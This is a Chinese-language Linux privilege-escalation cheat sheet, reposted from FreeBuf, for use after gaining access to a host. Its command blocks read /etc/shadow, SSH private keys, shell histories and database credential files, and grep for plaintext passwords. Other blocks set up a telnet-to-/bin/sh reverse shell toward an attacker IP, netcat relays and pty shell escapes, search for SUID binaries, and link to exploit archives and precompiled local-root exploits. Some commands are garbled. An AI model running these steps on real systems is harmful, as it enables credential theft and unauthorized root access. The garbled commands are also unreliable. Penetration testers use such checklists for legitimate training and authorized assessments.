    文中有的命令可能在你的主機上敲不出來，因為它可能是在其他版本的linux中所使用的命令。

##系統類型

###系統是什麼版本?
```bash
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```
###它的內核版本是什麼？
```bash
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```
###它的環境變量裡有些什麼？
```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```
###是否有台打印機？
```bash
lpstat -a
```

##應用與服務

###正在運行什麼服務？什麼樣的服務具有什麼用戶權限？
```bash
ps aux
ps -ef
top
cat /etc/service
```
###哪些服務具有root的權限？這些服務裡你看起來那些有漏洞,進行再次檢查！
```bash
ps aux | grep root
ps -ef | grep root
```
###安裝了哪些應用程序？他們是什麼版本？哪些是當前正在運行的？
```bash
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```
###Service設置，有任何的錯誤配置嗎？是否有任何（脆弱的）的插件？
```bash
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/
```
###主機上有哪些工作計劃？
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
###主機上可能有哪些純文本用戶名和密碼?
```bash
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "​​var $password" # Joomla
```

##通信與網絡

###NIC(s)，系統有哪些？它是連接到哪一個網絡？
```bash
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```
###網絡配置設置是什麼？網絡中有什麼樣的服務器？ DHCP服務器？ DNS服務器？網關？
```bash
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```
###其他用戶主機與系統的通信？
```bash
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```
###緩存？ IP和/或MAC地址?
```bash
arp -e
route
/sbin/route -nee
```
###數據包可能嗅探嗎？可以看出什麼？監聽流量
```bash
# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
```
###你如何get一個shell？你如何與系統進行交互？
```bash
# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
nc -lvp 4444 # Attacker. 輸入 (命令)
nc -lvp 4445 # Attacker. 輸出(結果)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目標系統上. 使用攻擊者的IP!
```
###如何端口轉發？ （端口重定向）
```bash
# rinetd
# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
# fpipe
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
#ssh
# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
#mknod
# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)
mknod
backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)
```
###建立隧道可能嗎？本地，遠程發送命令
```bash
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

##秘密信息和用戶

###你是誰？哪個id登錄？誰已經登錄？還有誰在這裡？誰可以做什麼呢？
```bash
id
who
w
last
cat /etc/passwd | cut -d: # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd # List of super users
cat /etc/sudoers
sudo -l
```
###可以找到什麼敏感文件？
```bash
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```
###什麼有趣的文件在home/directorie（S）裡？如果有權限訪問
```bash
ls -ahlR /root/
ls -ahlR /home/
```
###是否有任何密碼，腳本，數據庫，配置文件或日誌文件？密碼默認路徑和位置
```bash
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```
###用戶做過什麼？是否有任何密碼呢？他們有沒有編輯​​什麼？
```bash
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```
###可以找到什麼樣的用戶信息
```bash
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```
###private-key 信息能否被發現？
```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```
##文件系統
###哪些用戶可以寫配置文件在/ etc /？能夠重新配置服務？
```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group
ls -aRl /etc/ | awk ';$1 ~ /w.$/' 2>/dev/null # Other
find /etc/ -readable -type f 2>/dev/null # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```
###在/ var /有什麼可以發現？
```bash
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dh​​cp3/dhclient.leases
```
##網站上的任何隱藏配置/文件?配置文件與數據庫信息？
```bash
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```
###有什麼在日誌文件裡?（什麼能夠幫助到“本地文件包含”?)
```bash
# http://www.thegeekstuff.com/2011/08/linux-var-log-files/
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dh​​cp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
#
auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,
mail.log, mail.warn, messages, syslog, udev, wtmp(有什麼文件?log.系統引導……)
```
###如果命令限制，你可以打出哪些突破它的限制？
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```
###如何安裝文件系統？
```bash
mount
df -h
```
###是否有掛載的文件系統？
```bash
cat /etc/fstab
```
###什麼是高級Linux文件權限使用？ Sticky bits, SUID 和GUID
```bash
find / -perm -1000 -type d 2>/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
for i in `locate -r "bin$"`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2>/dev/null; done #
Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin,
/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID
(Quicker search)
#
findstarting at root (/), SGIDorSUID, not Symbolic links, only 3
folders deep, list with more detail and hideany errors (eg permission
denied)
find/-perm -g=so-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2>/dev/null
```
###在哪些目錄可以寫入和執行呢？幾個“共同”的目錄：/ tmp目錄，/var / tmp目錄/ dev /shm目錄
```bash
find / -writable -type d 2>/dev/null # world-writeable folders
find / -perm -222 -type d 2>/dev/null # world-writeable folders
find / -perm -o+w -type d 2>/dev/null # world-writeable folders
find / -perm -o+x -type d 2>/dev/null # world-executable folders
find / ( -perm -o+w -perm -o+x ) -type d 2>/dev/null # world-writeable & executable folders
Any "problem" files？可寫的的，“沒有使用"的文件
find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable files
find /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files
```
##準備和查找漏洞利用代碼
###安裝了什麼開發工具/語言/支持？
```bash
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
```
###如何上傳文件？
```bash
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```
###查找exploit代碼

http://www.exploit-db.com

http://1337day.com

http://www.securiteam.com

http://www.securityfocus.com

http://www.exploitsearch.net

http://metasploit.com/modules/

http://securityreason.com

http://seclists.org/fulldisclosure/

http://www.google.com

###查找更多有關漏洞的信息

http://www.cvedetails.com

http://packetstormsecurity.org/files/cve/[CVE]

http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]

http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]

http://www.91ri.org/

###(快速）“共同的“exploit,預編譯二進制代碼文件

http://tarantula.by.ru/localroot/

http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/

###上面的信息很難嗎？

快去使用第三方腳本/工具來試試吧！

系統怎麼打內核，操作系統，所有應用程序，插件和Web服務的最新補丁？

```bash
apt-get update && apt-get upgrade
yum update
```
###服務運行所需的最低的權限？

例如，你需要以root身份運行MySQL？
能夠從以下網站找到自動運行的腳本？ ！

http://pentestmonkey.net/tool​​s/unix-privesc-check/

http://labs.portcullis.co.uk/application/enum4linux/

http://bastille-linux.sourceforge.net

###（快速）指南和鏈接

例如

http://www.0daysecurity.com/penetration-testing/enumeration.html

http://www.microloft.co.uk/hacking/hacking3.htm

其他

http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf

http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf

http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html


##轉載出自

FreebuF.COM
